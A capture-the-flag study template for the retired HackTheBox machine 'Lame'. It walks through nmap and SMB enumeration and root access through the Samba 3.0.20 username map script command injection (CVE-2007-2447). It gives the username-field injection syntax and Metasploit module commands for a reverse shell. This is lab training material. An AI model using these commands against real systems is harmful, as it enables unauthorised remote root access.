# Lame — HackTheBox

> **Preparation stub.** Based on publicly documented information about this well-known retired
> machine — not an original solve, and no live flag values are recorded. Use this as a study
> scaffold; complete the bracketed fields when working the box under your own account. Only
> document legally authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | HackTheBox |
| Machine | Lame |
| Difficulty | Easy |
| Category | Linux |
| Target IP | 10.10.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A legacy Linux host (Ubuntu 8.04-era) running Samba **3.0.20**. The "username map script"
command-injection vulnerability (**CVE-2007-2447**) allows unauthenticated remote code execution
as **root**, because `smbd` processes the username field through a shell when `username map script`
is configured. There is no privilege-escalation step — the service runs as root, so the foothold
*is* root. The box's exposed `vsftpd 2.3.4` banner is a deliberate rabbit hole; its backdoor is
not exploitable here.

## Key vulnerability class

- **CWE:** CWE-78 — OS Command Injection.
- **Identifier:** **CVE-2007-2447** (Samba `usermap_script`), affecting Samba 3.0.0–3.0.25rc3.
- **Why it matters:** a textbook "map the service version to a known exploit" case. The whole path
  turns on reading `smbd 3.0.20` from the scan and knowing it predates the fix — methodology, not
  tooling, finds it.

## 1. Reconnaissance

```
nmap -sC -sV -p- -oA nmap/lame 10.10.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Version | Note |
|------|---------|---------|------|
| 21/tcp | ftp | vsftpd 2.3.4 | Banner bait — backdoor not working on this host |
| 22/tcp | ssh | OpenSSH 4.7p1 | Old, but not the path |
| 139/445 tcp | smb | Samba smbd 3.0.20 | **The vector** |
| 3632/tcp | distccd | distccd v1 | Secondary path (CVE-2004-2687) |

[Paste trimmed scan output on completion.]

## 2. Enumeration

```
enum4linux -a 10.10.x.x
smbclient -L //10.10.x.x/ -N
```

- Confirm Samba version `3.0.20` (the version, not the share contents, is what matters).
- **Ruled out:** vsftpd 2.3.4 backdoor (does not trigger here); distcc is a valid alternate path
  but lands as the low-priv `daemon` user and then needs a privesc — slower than the Samba route.
- [Record share listing / null-session results on completion.]

## 3. Exploitation

- **Chosen vector and why:** Samba `usermap_script` over distcc — it yields root in a single step
  with no privesc, the cleaner path.
- The injection is delivered through the SMB *username* field (e.g. `/=`nohup <cmd>``), which
  `smbd` passes to a shell.

```
# Metasploit path
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.x.x
set LHOST <tun0 ip>
run
# Manual path: smbclient/python that injects a reverse-shell payload into the username field
```

- **Shell lands as `root`** — no further escalation required.
- **User flag:** `[capture on completion]`
- **Root flag:** `[capture on completion]`

## 4. Post-exploitation

- Stabilise the shell (`python -c 'import pty; pty.spawn("/bin/bash")'`).
- Both flags are directly readable as root (`/root/root.txt`, `/home/makis/user.txt` or
  equivalent — confirm path on completion).

## 5. Tools used

| Phase | Tools |
|-------|-------|
| Recon | `nmap` (`-sC -sV -p-`) |
| Enumeration | `enum4linux`, `smbclient` |
| Exploitation | Metasploit `multi/samba/usermap_script` (or a manual injection script) |
| Post-exploitation | manual shell stabilisation |

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | (none required — service runs as root) | — |

## 7. Key learnings

- **Version-to-exploit mapping is the whole game on legacy boxes** — `smbd 3.0.20` is the single
  fact that unlocks the box. Always cross-reference every service version against known CVEs
  *before* trying anything noisy.
- **Not every open port is a path** — the vsftpd 2.3.4 banner is a classic distractor; recognising
  a rabbit hole quickly is a skill in itself.
- **Service account context matters** — when the vulnerable service runs as root, "exploitation"
  and "privesc" collapse into one step.

## 8. References

- CVE-2007-2447 — Samba `username map script` command injection (verify scope before citing).
- Samba 3.0.20 changelog / security advisory.
